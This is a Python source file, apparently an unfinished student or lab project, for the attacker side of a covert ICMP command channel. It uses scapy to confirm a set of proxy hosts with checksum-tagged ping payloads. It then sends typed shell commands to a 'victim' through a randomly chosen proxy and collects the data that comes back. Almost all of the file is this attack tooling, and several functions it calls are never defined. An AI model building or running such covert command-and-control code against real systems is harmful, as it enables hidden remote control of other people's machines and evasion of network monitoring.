#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import datetime 
import time
import ipaddress
import sys 
import os 
import argparse 
import re 
import random
import threading
from functools import partial 
import json
import type_singleton as singleton

file_path = "../comunication_methods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import comunication_methods as com

file_path = "../mymethods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import mymethods 


#-----------------------------------------



#-----------------------------------------
def callback_wait_conn_from_proxy(ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address=None,event_pktconn:threading.Event=None): 
    def callback(packet):
        print(f"callback wait_conn_from_proxy received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
            confirm_text=com.CONFIRM_PROXY+ip_vittima.compressed+ipaddress.ip_address(packet[IP].src).compressed
            checksum=mymethods.calc_checksum((confirm_text).encode())
            if checksum==packet[ICMP].id and confirm_text.encode() in packet[Raw].load: 
                print(f"Il pacchetto di {packet[IP].src} ha confermato la connessione") 
                com.set_threading_Event(event_pktconn) 
                return
            print(f"Il pacchetto di {packet[IP].src} non ha confermato la connessione") 
    return callback 

def callback_wait_proxy_update(ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address, thread_lock:threading.Lock, thread_proxy_response:dict, event_proxy_update:threading.Event): 
    def callback(packet):
        print(f"callback attacker_wait_proxy_update received:\n\t{packet.summary()}")
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
            try:
                confirm_text=com.CONFIRM_VICTIM+ip_vittima.compressed+"_"+ipaddress.ip_address(packet[IP].src).compressed
            except Exception as e:
                print(f"callback attacker_wait_proxy_update: {e}", file=sys.stderr)
                com.update_thread_response(
                    ipaddress.ip_address(packet[IP].src)
                    ,thread_lock
                    ,thread_proxy_response
                    ,response=False
                )
                if not event_proxy_update.get(packet[IP].src).is_set():
                    com.set_threading_Event(event_proxy_update.get(packet[IP].src))
                return
            checksum=mymethods.calc_checksum((confirm_text).encode()) 
            if packet[ICMP].id==checksum: 
                com.update_thread_response(
                    ipaddress.ip_address(packet[IP].src)
                    ,thread_lock
                    ,thread_proxy_response
                    ,response=True
                )
                if not event_proxy_update.get(packet[IP].src).is_set():
                    com.set_threading_Event(event_proxy_update.get(packet[IP].src))
    return callback

#----------------------------------------- 
def reset_event_update_foreach_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[],event_proxy_update:dict={}):
    try:
        if not com.is_list(proxy_list) or len(proxy_list)<=0:
            raise ValueError(f"proxy_list non è una lista o è vuota: {proxy_list}")
        if not com.is_dictionary(event_proxy_update):
            raise ValueError(f"La lista degli eventi non è un dizionmario: {event_proxy_update}")
    except Exception as e:
        raise Exception(f"reset_event_update_foreach_proxy: {e}") 
    for proxy in proxy_list:
        event_proxy_update.get(proxy.compressed).clear() 

def create_event_update_foreach_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]):
    try:
        if not com.is_list(proxy_list) or len(proxy_list)<=0:
            raise ValueError(f"proxy_list non è una lista o è vuota: {proxy_list}")
    except Exception as e:
        raise Exception(f"create_event_update_foreach_proxy: {e}")
    event_proxy_update={}
    for proxy in proxy_list:
        event_proxy_update.update({proxy.compressed:com.get_threading_Event()})    
    reset_event_update_foreach_proxy(proxy_list, event_proxy_update)
    #print(f"Eventi creati:\t{event_proxy_update}")
    print("Per ogni proxy creato il proprio evento di aggiornamento 'proxy_update'")
    return event_proxy_update 

#-----------------------------------------
def elimina_proxy_nonconnessi(thread_lock:threading.Lock=None, thread_response:dict=None, proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]):
    try:
        com.is_threading_lock(thread_lock) 
        com.is_dictionary(thread_response) 
        if not com.is_list(proxy_list) or len(proxy_list)<=0: 
            raise ValueError("elimina_proxy_nonconnessi: lista proxy non valida")
    except Exception as e:
        raise Exception(f"elimina_proxy_nonconnessi: {e}")
    thread_lock.acquire() 
    proxy_response=thread_response.items()
    thread_lock.release()   
    for proxy,value in proxy_response: 
        try: 
            if not value: 
                proxy_list.remove(ipaddress.ip_address(proxy)) 
        except Exception as e:
            print(f"check_available_proxies: {proxy} not present in list. {e}")

def sanifica_lista_proxy(proxy_list:list=None):
    try: 
        com.is_list(proxy_list)
    except Exception as e:
        raise Exception(f"sanifica_lista_proxy: {e}") 
    new_proxy_list=[address for proxy in proxy_list if (address:=com.is_valid_ipaddress(proxy)) is not None]
    print(f"Lista proxy sanificata: {new_proxy_list}")
    return new_proxy_list

def set_proxy_list(attack_file):
    proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
    for dict_proxy in attack_file.get("proxy_list", []):
        if not isinstance(dict_proxy, dict):
            print(f"proxy is not dict: {dict_proxy}")
            continue 
        for value in dict_proxy.values(): 
            try:
                proxy_ip=ipaddress.ip_address(value)
                proxy_list.append(proxy_ip)  
            except Exception as e:
                print(f"\tset_proxy_list: {e}") 
    print(f"Lista proxy sanificata")
    return proxy_list
#-----------------------------------------
def setIP_host():
        ip, errore=mymethods.find_local_IP() 
        if ip is None:
            ip="192.168.56.104"
        ip_host=ipaddress.ip_address(ip)        
        if not isinstance(ip_host, ipaddress.IPv4Address) and not isinstance(ip_host, ipaddress.IPv6Address):
            #print(f"Coulnd't get ip: {errore}") if ip_host is None else print(ip_host)
            raise ValueError(f"L'indirizzo IP del host non è valido: {ip_host}:{errore}") 
        return ip_host

def setIP_vittima(attack_file):
        ip_vittima = ipaddress.ip_address(attack_file.get("ip_vittima", None))  
        if ip_vittima is None or not (isinstance(ip_vittima, ipaddress.IPv4Address) or isinstance(ip_vittima, ipaddress.IPv6Address)):
            raise ValueError(f"L'indirizzo IP della vittima non è valido: {ip_vittima}") 
        return ip_vittima

def attack_type(json_file): 
        attack_function = singleton.AttackType().get_attack_function(json_file.get("attack_function"))
        if not isinstance(attack_function, dict) or len(attack_function.items())!=1:
            print(f"Funzione di attacco non definita ",
                f"non è un dizionario ma {type(attack_function)}" if not isinstance(attack_function, dict) 
                else f"funzioni ricavate {len(attack_function.items())}" if len(attack_function.items())!=1
                else None
            )
            attack_function=singleton.AttackType().choose_attack_function() 
        return attack_function

def load_config_file(default_file_path, path_of_file): 
        if not os.path.exists(path_of_file) or not str(path_of_file).endswith(".json"):
            if os.path.exists(default_file_path):
                print(f"\tFile di configurazione {file_path}  non trovato, si usa quello di default")
                path_of_file=default_file_path
            else: 
                raise FileNotFoundError(f"I file {path_of_file} e {default_file_path} non esistono")
        with open(path_of_file, 'r') as file: 
            print(f"File di configurazione {path_of_file} caricato correttamente") 
            return json.load(file)

#-----------------------------------------
def get_value_of_parser(args):
    if args is None: 
        raise Exception("get_value_of_parser: Nessun argomento passato") 
    return args.file_path

def check_value_in_parser(args):
    if type(args) is not argparse.Namespace or args is None:
        print("Nessun argomento passato") 
        return False
    try:
        com.is_string(args.file_path)
    except Exception as e:
        print("Devi specificare il file di configurazione con --file_path")
        mymethods.print_parser_supported_arguments(parser)
        return False 
    return True

def get_args_from_parser():
    global parser
    parser = argparse.ArgumentParser()
    parser.add_argument("--file_path",type=str, help="File di configurazione") 
    args= mymethods.check_args(parser)
    if not check_value_in_parser(args): 
        raise ValueError("Argomenti nel parser non corretti") 
    return get_value_of_parser(args) 

#-----------------------------------------
class Attacker:
    default_file_path:str = "./attack_file.json"  

    def __init__(self):
        try:
            path_of_file=get_args_from_parser() 
            attack_file=load_config_file(self.default_file_path, path_of_file)
        except Exception as e: 
            print(f"__init__ load file: {e}", file=sys.stderr)
            exit(1) 
        try:
            self.attack_function=attack_type(attack_file)
            print(f"Attacco selezionato: {self.attack_function}") 
            self.ip_vittima=setIP_vittima(attack_file)
            print(f"IP vittima valido: {type(self.ip_vittima) } {self.ip_vittima }")
            self.ip_host=setIP_host()  
            print(f"IP host valido: {type(self.ip_host)} {self.ip_host}")
            self.proxy_list=set_proxy_list(attack_file)
            self.event_proxy_update=create_event_update_foreach_proxy(self.proxy_list) 
        except Exception as e:
            print(f"__init__ main variable: {e}", file=sys.stderr)
            exit(1)  
        try:
            #self.check_available_proxies() 
            result=com.setup_thread_foreach_proxy(self.proxy_list,self.wait_proxy_update)
            self.thread_lock,self.thread_proxy_response,self.thread_list=result 
        except Exception as e:
            print(f"__init__ setup thread: {e}") 
            exit(1)
        try:
            for proxy in self.proxy_list:  
                try:
                    thread=self.thread_list.get(proxy.compressed)
                    if not isinstance(thread, threading.Thread):
                        #print(f"Thread non valido {thread}")
                        continue 
                    elif thread.ident is None: 
                        print(f"Thread for {proxy} started")
                        thread.start() 
                        #print(f"Thread ID: {thread.ident}")
                except Exception as e:
                    print(f"check_available_proxies: {e}")
                    continue 
                if self.confirm_connection_to_proxy(proxy) and self.wait_conn_from_proxy(proxy):
                    print(f"Connessione stabilita con {proxy}") 
                    com.update_thread_response(proxy, self.thread_lock, self.thread_proxy_response, True)
                else: 
                    print(f"Connessione fallita con {proxy}") 
            for proxy,thread in self.thread_list.items():
                if thread.ident is not None and thread.is_alive():  
                    com.set_threading_Event(self.event_proxy_update.get(proxy))
                    thread.join() 
            elimina_proxy_nonconnessi(self.thread_lock, self.thread_proxy_response, self.proxy_list) 
            print(f"Proxy disponibili dopo eliminazione\t{self.proxy_list}")
        except Exception as e:
            print(f"__init__ start thread: {e}") 
            exit(0)
    
    def wait_proxy_update(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address): 
        #print("\n\t(＾▽＾)\tattacker_wait_proxy_update\n") 
        try: 
            if not isinstance(self.ip_vittima, ipaddress.IPv4Address) and not isinstance(self.ip_vittima, ipaddress.IPv6Address):
                raise Exception(f"Indirizzo IP vittima non è ne un IPv4Address ne un IPv6Address: {self.ip_vittima}")
            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                raise Exception(f"Indirizzo IP proxy non è ne un IPv4Address ne un IPv6Address: {proxy}")
        except Exception as e:
            print(f"attacker_wait_proxy_update: {e}")
            return None
        
        try:
            confirm_text=com.CONFIRM_VICTIM + self.ip_vittima.compressed + "_" + proxy.compressed  
            #if len(confirm_text.split("_"))!=7:
            #    raise ValueError(f"Testo di conferma non valido") 
            #print(f"Testo di conferma impostato correttamente:\n\t{confirm_text}")
            checksum=mymethods.calc_checksum(confirm_text.encode()) 
            interface_4_proxy,_= mymethods.iface_src_from_IP(proxy)  
            if interface_4_proxy is None:
                raise ValueError(f"Interfaccia non valida {interface_4_proxy}")
            #elif interface_4_proxy=="lo": 
                #print(f"Interfaccia per l'aggiornamento di {proxy} -> loopback")
                #com.update_thread_response(proxy, self.thread_lock, self.thread_proxy_response, True) 
                #return com.get_thread_response(proxy,self.thread_lock,self.thread_proxy_response)
            print(f"Interfaccia per l'aggiornamento di {proxy} -> {interface_4_proxy}")
        except Exception as e:
            print(f"attacker_wait_proxy_update: {e}")
            return None
        
        filter=singleton.AttackType().get_filter_connection_from_function(
            "wait_proxy_update", proxy, checksum
        )
        event_thread=self.event_proxy_update.get(proxy.compressed)

        args={
            "filter":filter
            #,"count":"1" 
            ,"prn":callback_wait_proxy_update(
                 self.ip_vittima
                ,self.thread_lock
                ,self.thread_proxy_response
                ,event_thread
            )
            #,"store":True 
            ,"iface":interface_4_proxy
        } 
        try:
            thread_sniffer,thread_timer=com.sniff_packet(args,event=event_thread) 
            com.wait_threading_Event(event_thread) 
        except Exception as e:
            raise Exception(f"attacker_wait_conn_from_proxy: {e}") 
        if thread_sniffer and thread_sniffer.running: 
            thread_sniffer.stop()  
        if thread_timer and thread_timer.is_alive():
            thread_timer.cancel()  
        thread_response=com.get_thread_response(proxy,self.thread_lock,self.thread_proxy_response)
        #print(f"Risposta del proxy: {thread_response}")
        if thread_response: 
            print(f"Il proxy {proxy} è connesso alla vittima {self.ip_vittima}")
        else:
            print(f"Il proxy {proxy} non è connesso alla vittima {self.ip_vittima}",file=sys.stderr)  
        return thread_response  
    
    def confirm_connection_to_proxy(self,proxy): 
        #print("\n\t(＾▽＾)\tconfirm_connection_to_proxy\n")  
        try: 
            if not isinstance(self.ip_vittima, ipaddress.IPv4Address) and not isinstance(self.ip_vittima, ipaddress.IPv6Address):
                raise Exception(f"Indirizzo IP vittima non è ne un IPv4Address ne un IPv6Address: {self.ip_vittima}")
            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                raise Exception(f"Indirizzo IP proxy non è ne un IPv4Address ne un IPv6Address: {proxy}")
            if not isinstance(self.ip_host, ipaddress.IPv4Address) and not isinstance(self.ip_host, ipaddress.IPv6Address):
                raise Exception(f"Indirizzo IP host non è ne un IPv4Address ne un IPv6Address: {self.ip_host}")
        except Exception as e:
            print(f"confirm_connection_to_proxy: {e}")
            return False 
        
        try:
            interface_4_proxy,_= mymethods.iface_src_from_IP(proxy) 
            if interface_4_proxy is None:
                raise ValueError(f"Interfaccia non valida {interface_4_proxy}")
            elif interface_4_proxy=="lo": 
                #print(f"Interfaccia per confermarsi a {proxy} -> loopback")
                return True
            #print(f"Interfaccia per confermarsi a {proxy} -> {interface_4_proxy}")
        except Exception as e:
            print(f"confirm_connection_to_proxy: {e}")
            return False
        
        data=com.CONFIRM_ATTACKER+self.ip_vittima.compressed
        if com.send_packet(data.encode() ,proxy.compressed):  
            #print(f"Il proxy {proxy} ha risposto. Conferma connessione affermativa")
            return True 
        #print(f"Il proxy {proxy} non ha risposto. Conferma connessione negativa")
        return False
    
    def wait_conn_from_proxy(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address=None): 
        #print("\n\t(＾▽＾)\twait_conn_from_proxy\n")
        try:
            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                raise Exception(f"Indirizzo IP proxy non è ne un IPv4Address ne un IPv6Address: {proxy}")
        except Exception as e:
            print(f"wait_conn_from_proxy: {e}")
            return False
        confirm_text=com.CONFIRM_PROXY+self.ip_vittima.compressed+proxy.compressed
        checksum=mymethods.calc_checksum(confirm_text.encode())
        try:
            interface_4_proxy,_= mymethods.iface_src_from_IP(proxy)  
            if interface_4_proxy is None:
                raise ValueError(f"Interfaccia non valida {interface_4_proxy}")
            elif interface_4_proxy=="lo": 
                #print(f"Interfaccia per la conferma di {proxy} -> loopback")
                return True
            #print(f"Interfaccia per la conferma di {proxy} -> {interface_4_proxy}")
        except Exception as e:
            raise Exception(f"wait_conn_from_proxy: {e}") 
        filter=singleton.AttackType().get_filter_connection_from_function(
            "wait_conn_from_proxy", proxy, checksum
        )
        #print(f"wait_conn_from_proxy: {singleton.AttackType().get_filter_from_function(next(iter(self.attack_function)))}")
        self.event_pktconn=com.get_threading_Event()
        args={
            "filter":filter
            #,"count":1 
            ,"prn":callback_wait_conn_from_proxy(self.ip_vittima, self.event_pktconn)
            #,"store":True 
            ,"iface":interface_4_proxy
        }
        try:
            
            self.sniffer,self.pkt_timer,=com.sniff_packet(args,event=self.event_pktconn) 
            com.wait_threading_Event(self.event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_conn_from_proxy: {e}")  
        if self.sniffer and hasattr(self.sniffer, 'running') and self.sniffer.running: 
            com.stop_sinffer(self.sniffer)
        if com.stop_timer(self.pkt_timer): 
            #print(f"\twait_conn_from_proxy: Connessione confermata da {proxy}")
            return True
        #print(f"\twait_conn_from_proxy: Connessione non confermata da {proxy}")
        return False 
    
    #------------------------------
    def send_command_to_victim(self):
        self.received_data=initialize_list_for_data(self.proxy_list)
        self.data_lock=threading.Lock()
        self.event_thread_update=create_event_update_foreach_proxy(self.proxy_list)
        self.thread_lock,self.thread_proxy_response,self.thread_list=com.setup_thread_4_foreach_proxy(
            self.proxy_list,callback_function=self.wait_data_from_proxy)
        self.event_received_data=com.get_threading_Event()
        print("Attivo i thread per ricevere i dati") 
        for thread in self.thread_list.values():
            thread.start()
        #
        command=ask_command()
        print(f"il comando immesso è {command}")
        while command.lower() not in com.exit_cases:
            try:
                chosen_proxy=random.choice(self.proxy_list)
                print(f"il proxy scelto è {chosen_proxy}")
            except Exception as e:
                raise ValueError(f"send_command_to_victim: {e}") 
            send_start_to_proxies(chosen_proxy, self.proxy_list)
            chosen_proxy=send_command_to_chosen_proxy(command, chosen_proxy, self.proxy_list)
            for thread in self.thread_list.values():
                thread.join()
            print(self.thread_proxy_response)
            print(self.received_data)
            reset_event_update_foreach_proxy(self.proxy_list, self.event_thread_update)
            command=input(f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> ")
        print("Uscita dalla shell\texit") 
        update_proxies_end_communication(self.proxy_list)

    def wait_data_from_proxy(self,proxy):
        interface_4_proxy,_= mymethods.iface_src_from_IP(proxy)   
        filter=singleton.AttackType().get_filter_connection_from_function(
            "wait_proxy_update", proxy, ip_host=self.ip_host
        )

        args={
            "filter":filter
            #,"count":1 
            ,"prn": callback_wait_data_from_proxy()
            #,"store":True 
            ,"iface":interface_4_proxy
        }  
        try:
            event_thread=self.event_thread_update.get(proxy)
            thread_sniffer,thread_timer=com.sniff_packet(args,event=event_thread) 
            com.wait_threading_Event(event_thread) 
        except Exception as e:
            raise Exception(f"attacker_wait_conn_from_proxy: {e}") 
        print("inzio a fermare lo sniffer e il timer")
        if thread_sniffer and thread_sniffer.runing:
            com.stop_sinffer(thread_sniffer)
        if com.stop_timer(thread_timer): 
            print(f"{proxy} ha mandato i dati in tempo")
            com.update_thread_response(
                 proxy
                ,self.thread_lock
                ,self.thread_proxy_response
                ,True
            )
            return True 
        print(f"{proxy} non ha mandato i dati in tempo")
        com.update_thread_response(
             proxy
            ,self.thread_lock
            ,self.thread_proxy_response
            ,False
        )
        return False

    

if __name__=="__main__":
    print("Ciao")
    attacker=Attacker()
    #Fare 2a parte
